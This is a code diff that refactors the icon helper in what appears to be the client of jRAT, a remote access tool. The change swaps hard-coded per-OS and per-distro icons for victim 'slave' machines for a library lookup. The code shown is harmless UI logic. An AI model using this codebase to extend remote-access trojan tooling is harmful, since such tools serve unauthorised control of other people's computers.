@@ -12,33 +12,10 @@ import se.jrat.client.AbstractSlave;
 import se.jrat.client.Main;
 import se.jrat.client.ui.frames.Frame;
 
-import com.redpois0n.oslib.Distro;
-import com.redpois0n.oslib.OperatingSystem;
+import com.redpois0n.oslib.Icons;
 
 
 public class IconUtils {
-	
-	public static final ImageIcon OS_WIN = IconUtils.getIcon("os");
-	public static final ImageIcon OS_WIN8 = IconUtils.getIcon("os_win8");
-	public static final ImageIcon OS_MAC = IconUtils.getIcon("os_mac");
-	public static final ImageIcon OS_LINUX = IconUtils.getIcon("os_linux");
-	public static final ImageIcon OS_ANDROID = IconUtils.getIcon("os_android");
-	public static final ImageIcon OS_FREEBSD = IconUtils.getIcon("os_freebsd");
-	public static final ImageIcon OS_OPENBSD = IconUtils.getIcon("os_openbsd");
-	public static final ImageIcon OS_SOLARIS = IconUtils.getIcon("os_solaris");
-	public static final ImageIcon OS_OTHERS = IconUtils.getIcon("last_modified");
-	
-	public static final ImageIcon DIST_UBUNTU = IconUtils.getIcon("dist_ubuntu");
-	public static final ImageIcon DIST_KALI = IconUtils.getIcon("dist_kali");
-	public static final ImageIcon DIST_CENTOS = IconUtils.getIcon("dist_centos");
-	public static final ImageIcon DIST_DEBIAN = IconUtils.getIcon("dist_debian");
-	public static final ImageIcon DIST_ELEMENTARY = IconUtils.getIcon("dist_elementaryos");
-	public static final ImageIcon DIST_MINT = IconUtils.getIcon("dist_mint");
-	public static final ImageIcon DIST_SLACKWARE = IconUtils.getIcon("dist_slackware");
-	public static final ImageIcon DIST_ARCH = IconUtils.getIcon("dist_arch");
-	public static final ImageIcon DIST_GENTOO = IconUtils.getIcon("dist_gentoo");
-	public static final ImageIcon DIST_RASPBIAN = IconUtils.getIcon("dist_raspbian");
-	public static final ImageIcon DIST_STEAMOS = IconUtils.getIcon("dist_steam");
 
 	public static ImageIcon getIcon(String name, boolean defaultfolder) {
 		URL url;
@@ -107,55 +84,13 @@ public class IconUtils {
 	}
 	
 	public static ImageIcon getOSIcon(AbstractSlave slave) {
-		ImageIcon icon;
-		
-		if (slave.getOS() == OperatingSystem.WINDOWS) {
-			if (slave.getOperatingSystem().startsWith("Windows 8")) {
-				icon = OS_WIN8;
-			} else {
-				icon = OS_WIN;
-			}
-		} else if (slave.getOS() == OperatingSystem.OSX) {
-			icon = OS_MAC;
-		} else if (slave.getOS() == OperatingSystem.LINUX) {
-			if (slave.getDistro() == Distro.UBUNTU) {
-				icon = DIST_UBUNTU;
-			} else if (slave.getDistro() == Distro.KALI || slave.getDistro() == Distro.BACKTRACK) {
-				icon = DIST_KALI;
-			} else if (slave.getDistro() == Distro.CENTOS) {
-				icon = DIST_CENTOS;
-			} else if (slave.getDistro() == Distro.DEBIAN) {
-				icon = DIST_DEBIAN;
-			} else if (slave.getDistro() == Distro.ELEMENTARYOS) {
-				icon = DIST_ELEMENTARY;
-			} else if (slave.getDistro() == Distro.MINT) {
-				icon = DIST_MINT;
-			} else if (slave.getDistro() == Distro.SLACKWARE) {
-				icon = DIST_SLACKWARE;
-			} else if (slave.getDistro() == Distro.ARCH) {
-				icon = DIST_ARCH;
-			} else if (slave.getDistro() == Distro.GENTOO) {
-				icon = DIST_GENTOO;
-			} else if (slave.getDistro() == Distro.RASPBIAN) {
-				icon = DIST_RASPBIAN;
-			} else if (slave.getDistro() == Distro.STEAMOS) {
-				icon = DIST_STEAMOS;
-			} else {
-				icon = OS_LINUX;
-			}
-		} else if (slave.getOS() == OperatingSystem.OPENBSD) {
-			icon = OS_OPENBSD;
-		} else if (slave.getOS() == OperatingSystem.ANDROID) {
-			icon = OS_ANDROID;
-		} else if (slave.getOS() == OperatingSystem.SOLARIS) {
-			icon = OS_SOLARIS;
-		} else if (slave.getOS() == OperatingSystem.FREEBSD) {
-			icon = OS_FREEBSD;
-		} else {
-			icon = OS_OTHERS;
+		String str = Icons.getIconString(slave.getOS(), slave.getOperatingSystem());
+		ImageIcon icon = IconUtils.getIcon(str);
+		if (icon == null) {
+			icon = IconUtils.getIcon("os_unknown");
 		}
-		
 		return icon;
+		
 	}
 
 	public static ImageIcon getFileIcon(int mode) {
